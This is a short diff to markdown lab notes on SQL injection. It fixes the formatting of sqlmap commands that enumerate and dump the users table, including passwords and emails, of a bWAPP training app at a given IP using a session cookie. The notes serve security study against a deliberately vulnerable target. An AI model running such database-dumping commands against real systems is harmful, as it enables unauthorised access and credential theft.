@@ -81,7 +81,7 @@ IF(0,name,age)
     - Get a list of tables for database bWAPP
   - ```sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users --columns``` 
     - Get the list of columns in the users table of bWAPP database
-  - sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump``` 
+  - ```sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump``` 
     - Dump password and email for admin from the users table. Press 'n' twice when prompted
 
 - Burp & SQLMAP
